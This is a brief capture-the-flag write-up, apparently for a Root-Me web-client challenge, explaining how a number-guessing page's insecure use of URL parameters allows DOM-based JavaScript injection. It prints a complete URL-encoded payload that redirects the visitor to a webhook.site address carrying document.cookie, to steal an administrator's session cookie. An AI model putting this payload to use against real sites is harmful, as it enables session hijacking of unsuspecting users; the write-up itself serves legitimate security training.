
------

This challenge involved a random number guessing game which was pretty much impossible to beat (besides the point). The JavaScript was utilising information from the URL in order to change variables in a script.

Although we could not see the back end, i assumed it was accessing the DOM to get URL parameters and executing the number guessing in client-sided JavaScript.

Because it was accessing the DOM in an insecure way we could inject JavaScript and redirect the user to a webhook and steal the administrator cookie. 

![[Pasted image 20250511062657.png]]

The payload was:
```
http://challenge01.root-me.org/web-client/ch32/index.php?number=5%27%3Bwindow%2Elocation%2Ehref%20%3D%20%22https%3A%2F%2Fwebhook%2Esite%2F4a928330%2D5be9%2D46ba%2D82a5%2D37af9fa02135%3Fcookie%3D%22%20%2B%20document%2Ecookie%3B%20%2F%2F
```